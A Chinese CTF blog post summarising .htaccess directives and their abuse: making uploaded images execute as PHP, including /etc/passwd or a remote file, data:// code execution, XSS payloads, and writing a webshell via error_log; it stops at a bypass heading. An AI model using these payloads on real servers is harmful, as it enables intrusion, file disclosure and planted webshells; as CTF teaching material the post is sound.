

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Yu ting">
  <meta name="keywords" content="">
  <title>.htaccessæ€»ç»“ - Fearless&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"fearless.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Fearless's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title=".htaccessæ€»ç»“">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-08-10 00:29" pubdate>
        August 10, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.5k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      31
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">.htaccessæ€»ç»“</h1>
            
            <div class="markdown-body">
              <p>ç»å¸¸ç¢°åˆ°ä¸€äº›é¢˜ç›®éœ€è¦å€ŸåŠ©.htaccessï¼Œä¸”ç”¨æ³•å¾ˆå¤šï¼Œè¿™é‡Œæ¥åšä¸€ä¸ªæ€»ç»“ã€‚</p>
<h4 id="æ¦‚å¿µ"><a class="header-anchor" href="#æ¦‚å¿µ">ğŸ­</a>æ¦‚å¿µ</h4>
<p>.htaccessæ–‡ä»¶(â€œåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ  å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ  ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/AllowOverride">AllowOverride</a>æŒ‡ä»¤æ¥è®¾ç½®ã€‚</p>
<p>.htaccess ä¸­æœ‰ <code>#</code> å•è¡Œæ³¨é‡Šç¬¦ï¼Œä¸”æ”¯æŒ <code>\</code> æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œã€‚</p>
<p>.htaccess æ–‡ä»¶ä¸­çš„é…ç½®æŒ‡ä»¤ä½œç”¨äº .htaccess æ–‡ä»¶æ‰€åœ¨çš„<strong>ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•</strong>ï¼Œä½†å…¶ä¸Šçº§ç›®å½•ä¹Ÿå¯èƒ½ä¼šæœ‰ .htaccess æ–‡ä»¶ï¼Œè€ŒæŒ‡ä»¤æ˜¯æŒ‰æŸ¥æ‰¾é¡ºåºä¾æ¬¡ç”Ÿæ•ˆçš„ï¼Œæ‰€ä»¥ä¸€ä¸ªç‰¹å®šç›®å½•ä¸‹çš„ .htaccess æ–‡ä»¶ä¸­çš„æŒ‡ä»¤å¯èƒ½ä¼šè¦†ç›–å…¶ä¸Šçº§ç›®å½•ä¸­çš„  .htaccess æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ï¼Œå³å­ç›®å½•ä¸­çš„æŒ‡ä»¤ä¼šè¦†ç›–çˆ¶ç›®å½•æˆ–è€…ä¸»é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ã€‚</p>
<h4 id="é…ç½®"><a class="header-anchor" href="#é…ç½®">ğŸ­</a>é…ç½®</h4>
<pre><code class="hljs css"><span class="hljs-selector-tag">AllowOverride</span>  <span class="hljs-selector-tag">All</span>    # å¯åŠ¨<span class="hljs-selector-class">.htaccess</span>æ–‡ä»¶çš„ä½¿ç”¨
<span class="hljs-selector-tag">AccessFileName</span>  <span class="hljs-selector-class">.config</span>    # å°†<span class="hljs-selector-class">.htaccess</span>ä¿®æ”¹ä¸º<span class="hljs-selector-class">.config</span></code></pre>
<h4 id="ä½œç”¨"><a class="header-anchor" href="#ä½œç”¨">ğŸ­</a>ä½œç”¨</h4>
<p>å¯ä»¥å®ç°ç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p>
<h4 id="SetHandler"><a class="header-anchor" href="#SetHandler">ğŸ­</a>SetHandler</h4>
<p>å¯ä»¥å¼ºåˆ¶æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢«ä¸€ä¸ªæŒ‡å®šçš„å¤„ç†å™¨å¤„ç†ã€‚</p>
<p>ç”¨æ³•ï¼š</p>
<pre><code class="hljs pgsql">SetHandler <span class="hljs-keyword">handler</span>-<span class="hljs-type">name</span>|<span class="hljs-keyword">None</span></code></pre>
<p>å¦‚ï¼š</p>
<pre><code class="hljs applescript">SetHandler <span class="hljs-built_in">application</span>/x-httpd-php<span class="hljs-comment">#å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«å½“åš php è§£æ</span>
SetHandler server-status<span class="hljs-comment">#å¼€å¯ Apache çš„æœåŠ¡å™¨çŠ¶æ€ä¿¡æ¯ï¼ˆserver-status æ˜¯ Apache è‡ªå¸¦ä¸€ä¸ªæŸ¥çœ‹ Apache çŠ¶æ€çš„åŠŸèƒ½æ¨¡å—ï¼‰ï¼Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰è®¿é—®æœ¬ç«™çš„è®°å½•</span></code></pre>
<h4 id="AddHandler"><a class="header-anchor" href="#AddHandler">ğŸ­</a>AddHandler</h4>
<p>å®ç°åœ¨æ–‡ä»¶æ‰©å±•åä¸ç‰¹å®šçš„å¤„ç†å™¨ä¹‹é—´å»ºç«‹æ˜ å°„</p>
<p>ç”¨æ³•ï¼š</p>
<pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>handler-name <span class="hljs-keyword">extensive </span>[<span class="hljs-keyword">extensive] </span>...</code></pre>
<p>å¦‚ï¼š</p>
<pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xxx<span class="hljs-comment">#å°†æ‰©å±•åä¸º .xxx çš„æ–‡ä»¶ä½œä¸º CGI è„šæœ¬æ¥å¤„ç†</span></code></pre>
<h4 id="php-value"><a class="header-anchor" href="#php-value">ğŸ­</a>php_value</h4>
<p>è®¾å®šæŒ‡å®šçš„ PHP çš„é…ç½®å€¼ã€‚è¦æ¸…é™¤å…ˆå‰è®¾å®šçš„å€¼ï¼ŒæŠŠ value è®¾ä¸º noneã€‚ä½†æ˜¯ php_value ä¸èƒ½ç”¨æ¥è®¾å®šå¸ƒå°”å€¼ï¼Œå¦‚æœè¦è®¾å®šå¸ƒå°”å€¼çš„è¯åº”è¯¥ç”¨ php_flagã€‚</p>
<p>ç”¨æ³•ï¼š</p>
<pre><code class="hljs ceylon">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> name <span class="hljs-keyword">value</span></code></pre>
<p>ä¸æ˜¯æ‰€æœ‰çš„ PHP é…ç½®éƒ½å¯ä»¥ç”¨ php_value æ¥è®¾å®šï¼Œå®ƒåªèƒ½ç”¨äº PHP_INI_ALL æˆ– PHP_INI_PERDIR ç±»å‹çš„æŒ‡ä»¤ï¼š</p>
<p><img src="/2021/08/10/hta/1.png" srcset="/img/loading.gif" alt="1"></p>
<p>å¦‚</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">php_value</span> <span class="hljs-selector-tag">auto_prepend_file</span> <span class="hljs-selector-tag">images</span><span class="hljs-selector-class">.png</span>#è®¾ç½®è®¿é—®ä¸€ä¸ª <span class="hljs-selector-tag">PHP</span> æ–‡ä»¶æ—¶ï¼Œåœ¨è¯¥æ–‡ä»¶è§£æä¹‹å‰ä¼šå…ˆè‡ªåŠ¨åŒ…å«å¹¶è§£æ <span class="hljs-selector-tag">images</span><span class="hljs-selector-class">.png</span> æ–‡ä»¶</code></pre>
<h4 id="php-flag"><a class="header-anchor" href="#php-flag">ğŸ­</a>php_flag</h4>
<p>è®¾å®šå¸ƒå°”å€¼ç±»å‹çš„ PHP é…ç½®é€‰é¡¹ã€‚</p>
<p>ç”¨æ³•ï¼š</p>
<pre><code class="hljs applescript">php_flag <span class="hljs-built_in">name</span> <span class="hljs-keyword">on</span>|off</code></pre>
<p>php_flag å¯ä»¥è®¾å®šçš„é…ç½®ä¹Ÿæ˜¯æœ‰èŒƒå›´çš„ï¼š</p>
<p><img src="/2021/08/10/hta/2.png" srcset="/img/loading.gif" alt="2"></p>
<p>å®ä¾‹</p>
<pre><code class="hljs angelscript">php_flag engine <span class="hljs-number">0</span>#å°† engine è®¾ç½®ä¸º <span class="hljs-number">0</span>ï¼Œå³åœ¨æœ¬ç›®å½•å’Œå­ç›®å½•ä¸­å…³é—­ PHP è§£æï¼Œå¯ä»¥é€ æˆæºç æ³„éœ²</code></pre>
<h4 id="AddType"><a class="header-anchor" href="#AddType">ğŸ­</a>AddType</h4>
<p>å°†ç»™å®šçš„æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å†…å®¹ç±»å‹ã€‚</p>
<p>ç”¨æ³•ï¼š</p>
<pre><code class="hljs mipsasm"><span class="hljs-keyword">AddType </span>media-type <span class="hljs-keyword">extensive </span>[<span class="hljs-keyword">extensive] </span>...</code></pre>
<p>å¦‚</p>
<pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .gif<span class="hljs-comment">#æŠŠ gif ä¸ºåç¼€çš„æ–‡ä»¶å½“åš php æ–‡ä»¶è§£æã€‚</span>
AddType <span class="hljs-built_in">application</span>/x-httpd-php png jpg gif<span class="hljs-comment">#æŠŠ .png .jpg .gif å¤šä¸ªåç¼€çš„æ–‡ä»¶å½“åš php è§£æ</span></code></pre>
<h2 id="åˆ©ç”¨"><a class="header-anchor" href="#åˆ©ç”¨">ğŸ­</a>åˆ©ç”¨</h2>
<h4 id="å›¾ç‰‡é©¬è§£æ"><a class="header-anchor" href="#å›¾ç‰‡é©¬è§£æ">ğŸ­</a>å›¾ç‰‡é©¬è§£æ</h4>
<p>åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸­ç»å¸¸é‡åˆ°ä¸Šä¼ å›¾ç‰‡é©¬çš„æƒ…å†µï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒå¼€å¯äº†  .htaccess å¹¶ä¸”ä¸Šä¼ çš„é»‘åå•æ²¡æœ‰é™åˆ¶ .htaccess æ–‡ä»¶çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼  .htaccess  æ–‡ä»¶ï¼Œå¯¹ç›®æ ‡ç¯å¢ƒçš„ç›®å½•è¿›è¡Œç›¸åº”çš„é…ç½®ï¼Œç„¶åå†ä¸Šä¼ å›¾ç‰‡ï¼Œä½¿å›¾ç‰‡çš„ PHP æ¶æ„ä»£ç å¾—ä»¥è¢«ç›´æ¥è§£ææ‰§è¡Œã€‚</p>
<p>å¸¸ç”¨æŒ‡ä»¤ï¼š</p>
<blockquote>
<p>SetHandler æŒ‡ä»¤<br>
å¼ºåˆ¶å°†æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢« PHP å¤„ç†å™¨å¤„ç†å¹¶è§£æï¼š</p>
<pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-comment"># å°†images.png å½“åš php æ‰§è¡Œ</span></span>
<span class="hljs-meta">&gt;</span><span class="bash">&lt;FilesMatch <span class="hljs-string">&quot;images.png&quot;</span>&gt;</span>
SetHandler application/x-httpd-php
<span class="hljs-meta">&gt;</span><span class="bash">&lt;/FilesMatch&gt;</span></code></pre>
</blockquote>
<blockquote>
<p>AddType æŒ‡ä»¤</p>
<p>å°†ç»™å®šçš„æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ° PHP çš„å†…å®¹ç±»å‹ï¼š</p>
<pre><code class="hljs applescript"><span class="hljs-comment"># å°† .jpg å½“åš php æ–‡ä»¶è§£æ</span>
AddType <span class="hljs-built_in">application</span>/x-httpd-php .png</code></pre>
</blockquote>
<p>è¿™ä¸¤ç§é…ç½®éƒ½å¯ä»¥ä½¿æˆ‘ä»¬ä¸Šä¼ çš„é PHP ç±»å‹çš„ Webshell è¢«å½“åš PHP ç›´æ¥è§£æ.</p>
<h4 id="æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#æ–‡ä»¶åŒ…å«">ğŸ­</a>æ–‡ä»¶åŒ…å«</h4>
<h5 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#æœ¬åœ°æ–‡ä»¶åŒ…å«">ğŸ­</a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h5>
<p>åœ¨æœ¬ç›®å½•æˆ–å­ç›®å½•ä¸­æœ‰å¯è§£æçš„ PHP æ–‡ä»¶æ—¶ï¼Œå¯ä»¥é€šè¿‡ php_value æ¥è®¾ç½® auto_prepend_file æˆ–è€… auto_append_file  é…ç½®é€‰é¡¹æ¥è®©æ‰€æœ‰çš„ PHP æ–‡ä»¶è‡ªåŠ¨åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶æˆ–æ¶æ„æ–‡ä»¶ï¼ˆå¦‚WebShellï¼‰ï¼Œæ¥è§¦å‘æ–‡ä»¶åŒ…å«ã€‚</p>
<p>å¦‚åŒ…å« /etc/passwdï¼š</p>
<blockquote>
<p>auto_prepend_file</p>
<pre><code class="hljs awk">php_value auto_prepend_file <span class="hljs-regexp">/etc/</span>passwd</code></pre>
</blockquote>
<blockquote>
<p>auto_append_file</p>
<pre><code class="hljs awk">php_value auto_append_file <span class="hljs-regexp">/etc/</span>passwd</code></pre>
</blockquote>
<p>è¿™ä¸¤ä¸ªé…ç½®é€‰é¡¹ç”¨äºè®¾ç½®è®¿é—®ä¸€ä¸ª PHP æ–‡ä»¶æ—¶ï¼Œåœ¨è¯¥ PHP æ–‡ä»¶è§£æä¹‹å‰ä¼šå…ˆè‡ªåŠ¨åŒ…å«å¹¶è§£æçš„æ–‡ä»¶ã€‚å¦‚ï¼šç›®æ ‡ç¯å¢ƒçš„å½“å‰ç›®å½•ä¸­å­˜åœ¨è‡³å°‘ä¸€ä¸ª PHP æ–‡ä»¶ä¸”ä¸Šä¼ é»‘åå•æ²¡æœ‰é™åˆ¶ .htaccess æ–‡ä»¶ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥è®© index.php æ–‡ä»¶åŒ…å«ä¸€ä¸ªå«æœ‰ Webshell çš„æ–‡ä»¶æ¥ Getshellï¼Œå¯ç”¨äºå›¾ç‰‡é©¬çš„è§£æï¼š</p>
<pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_file images.png
æˆ–:
php_value <span class="hljs-built_in">auto</span>_append_file images.png</code></pre>
<h5 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#è¿œç¨‹æ–‡ä»¶åŒ…å«">ğŸ­</a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h5>
<p>PHP çš„ allow_url_includeé»˜è®¤æ˜¯å…³é—­çš„ï¼Œå¦‚æœå¼€å¯çš„è¯å°±å¯ä»¥è¿›è¡Œè¿œç¨‹åŒ…å«ã€‚å› ä¸º allow_url_include çš„é…ç½®èŒƒå›´ä¸º  PHP_INI_SYSTEMï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ php_flag æŒ‡ä»¤åœ¨ .htaccess æ–‡ä»¶ä¸­å¼€å¯ã€‚å½“ allow_url_include=Onæ—¶<code>.htaccess </code>æ–‡ä»¶ä¸­çš„è®¾ç½®ä¸ºï¼š</p>
<pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_file http:<span class="hljs-comment">//192.168.0.181/phpinfo.txt</span>
æˆ–:
php_value <span class="hljs-built_in">auto</span>_append_file http:<span class="hljs-comment">//192.168.0.181/phpinfo.txt</span></code></pre>
<p>è¿œç¨‹ä¸»æœºä¸Šçš„phpinfo.txtå°±å¯ä»¥å†™ä¸€äº›æ¶æ„ä»£ç ã€‚</p>
<h4 id="ä»»æ„ä»£ç æ‰§è¡Œ"><a class="header-anchor" href="#ä»»æ„ä»£ç æ‰§è¡Œ">ğŸ­</a>ä»»æ„ä»£ç æ‰§è¡Œ</h4>
<h5 id="é€šè¿‡-PHP-ä¼ªåè®®"><a class="header-anchor" href="#é€šè¿‡-PHP-ä¼ªåè®®">ğŸ­</a>é€šè¿‡ PHP ä¼ªåè®®</h5>
<p>åˆ©ç”¨ auto_prepend_file æˆ– auto_append_file è¿™ä¸¤ä¸ªé…ç½®é¡¹ã€‚æ¡ä»¶ï¼š</p>
<ul>
<li>allow_url_fopen=On</li>
<li>allow_url_include=On</li>
<li>ç›®æ ‡ç¯å¢ƒçš„å½“å‰ç›®å½•ä¸­å­˜åœ¨è‡³å°‘ä¸€ä¸ª PHP æ–‡ä»¶</li>
</ul>
<pre><code class="hljs xquery">php_value auto_append_file data://<span class="hljs-type">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
æˆ–:
php_value auto_append_file data://<span class="hljs-type">text</span>/plian,<span class="hljs-meta">%3c</span><span class="hljs-meta">%3fphp</span>+phpinfo()<span class="hljs-meta">%3b</span><span class="hljs-meta">%3f</span><span class="hljs-meta">%3e</span>
// å¦‚æœä¸ä½¿ç”¨base64åŠ å¯†åˆ™æ³¨æ„éœ€è¦urlç¼–ç </code></pre>
<h5 id="é€šè¿‡è§£æ-htaccess-æ–‡ä»¶"><a class="header-anchor" href="#é€šè¿‡è§£æ-htaccess-æ–‡ä»¶">ğŸ­</a>é€šè¿‡è§£æ .htaccess æ–‡ä»¶</h5>
<blockquote>
<p>é€šè¿‡åŒ…å« .htaccess è‡ªèº«</p>
<pre><code class="hljs php-template"><span class="xml">php_value auto_append_file .htaccess</span>
<span class="xml">#</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre>
</blockquote>
<blockquote>
<p>ç›´æ¥å°† .htaccess æ–‡ä»¶å½“åš PHPæ–‡ä»¶å¤„ç†</p>
<p>å½“ç›®æ ‡ç¯å¢ƒå½“å‰ç›®å½•æˆ–å­ç›®å½•ä¸‹æ²¡æœ‰ PHP æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œéœ€è¦å…ˆåœ¨ .htaccess é‡Œé¢è®¾ç½®å…è®¸è®¿é—® .htaccess æ–‡ä»¶ï¼Œå¦åˆ™ä¼šForbiddenï¼š</p>
<pre><code class="hljs gams">&gt;&lt;<span class="hljs-keyword">Files</span> ~ <span class="hljs-string">&quot;^.ht&quot;</span>&gt;
Require <span class="hljs-keyword">all</span> granted
Order allow,deny
Allow from <span class="hljs-keyword">all</span>
&gt;&lt;/<span class="hljs-keyword">Files</span>&gt;</code></pre>
<p>ç„¶åå†è®¾ç½®å°† .htaccess æŒ‡å®šå½“åš PHP æ–‡ä»¶å¤„ç†å¹¶è§£æï¼š</p>
<pre><code class="hljs php-template"><span class="xml">&gt;SetHandler application/x-httpd-php</span>
<span class="xml">&gt;# </span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre>
<p>ç›´æ¥è®¿é—® .htaccess æ–‡ä»¶å³å¯æŠŠ .htaccess æ–‡ä»¶å½“åš PHP æ–‡ä»¶å¤„ç†å¹¶æ‰§è¡Œé‡Œé¢çš„ PHP ä»£ç ã€‚</p>
</blockquote>
<h4 id="è¿›è¡Œ-XSS-æ”»å‡»"><a class="header-anchor" href="#è¿›è¡Œ-XSS-æ”»å‡»">ğŸ­</a>è¿›è¡Œ XSS æ”»å‡»</h4>
<h5 id="é€šè¿‡è®¾ç½®-highlight-file"><a class="header-anchor" href="#é€šè¿‡è®¾ç½®-highlight-file">ğŸ­</a>é€šè¿‡è®¾ç½® highlight_file</h5>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ .htaccess æ–‡ä»¶è®¾å®š highlight.comment é€‰é¡¹ï¼ŒæŒ‡å®šéœ€è¦é«˜äº®çš„å†…å®¹ï¼Œä»è€Œè¿›è¡Œ XSSã€‚</p>
<p>.htaccessï¼š</p>
<pre><code class="hljs xml">php_value highlight.comment &#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;</code></pre>
<p>index.php:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-comment">// comment</span></code></pre>
<p>è®¿é—®index.phpå³å¯è§¦å‘ XSSã€‚</p>
<h5 id="é€šè¿‡é”™è¯¯æ¶ˆæ¯é“¾æ¥"><a class="header-anchor" href="#é€šè¿‡é”™è¯¯æ¶ˆæ¯é“¾æ¥">ğŸ­</a>é€šè¿‡é”™è¯¯æ¶ˆæ¯é“¾æ¥</h5>
<p>.htaccess ï¼š</p>
<pre><code class="hljs apache"><span class="hljs-attribute">php_flag</span> display_errors <span class="hljs-number">1</span>
<span class="hljs-attribute">php_flag</span> html_errors <span class="hljs-number">1</span>
<span class="hljs-attribute">php_value</span> docref_root <span class="hljs-string">&quot;&#x27;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span></code></pre>
<p>index.php:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;foo&#x27;</span>); <span class="hljs-comment">// è¿™é‡Œä¼šæŠ¥é”™</span></code></pre>
<h4 id="è‡ªå®šä¹‰é”™è¯¯æ–‡ä»¶ï¼ˆå¯å†™Webshellï¼‰"><a class="header-anchor" href="#è‡ªå®šä¹‰é”™è¯¯æ–‡ä»¶ï¼ˆå¯å†™Webshellï¼‰">ğŸ­</a>è‡ªå®šä¹‰é”™è¯¯æ–‡ä»¶ï¼ˆå¯å†™Webshellï¼‰</h4>
<p>error_log å¯ä»¥å°† PHP è¿è¡ŒæŠ¥é”™çš„è®°å½•å†™åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ .htaccess æ–‡ä»¶è®¾å®š error_log é€‰é¡¹æ¥è‡ªå®šä¹‰é”™è¯¯æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œå¹¶ä»¥æ­¤æ¥å†™å…¥Webshellï¼š</p>
<pre><code class="hljs awk">php_value error_log <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>shell.php
php_value include_path <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span>
<span class="hljs-comment"># include_path ç”¨æ¥å°†include()çš„é»˜è®¤ç›®å½•è·¯å¾„æ”¹å˜</span></code></pre>
<p>index.phpå’Œä¸Šé¢ä¸€æ ·ï¼Œè®¿é—® index.phpï¼Œä¼šæŠ¥é”™å¹¶è®°å½•åœ¨ shell.php æ–‡ä»¶ä¸­ï¼Œä½†æ˜¯ <code>&lt;</code> ç­‰å­—ç¬¦ä¼šç»è¿‡ html ç¼–ç ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ UTF-7 ç¼–ç æ ¼å¼æ¥ç»•è¿‡ï¼Œè¯¦è§ï¼šbuu é‡Œçš„[XNUCA2019Qualifier]EasyPHP</p>
<h4 id="ç»•è¿‡-ç‰¹æ®Šå­—ç¬¦"><a class="header-anchor" href="#ç»•è¿‡-ç‰¹æ®Šå­—ç¬¦">ğŸ­</a>ç»•è¿‡ &lt;? ç‰¹æ®Šå­—ç¬¦</h4>
<p>æœ‰æ—¶å€™ç›®æ ‡ç¯å¢ƒä¼šé™åˆ¶æˆ‘ä»¬ä¸Šä¼ æˆ–å†™å…¥çš„æ–‡ä»¶å†…å®¹ä¸­ä¸èƒ½å­˜åœ¨ <code>&lt;?</code> ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨ .htaccess æ¥ç»•è¿‡ã€‚</p>
<h5 id="Base64-ç¼–ç ç»•è¿‡"><a class="header-anchor" href="#Base64-ç¼–ç ç»•è¿‡">ğŸ­</a>Base64 ç¼–ç ç»•è¿‡</h5>
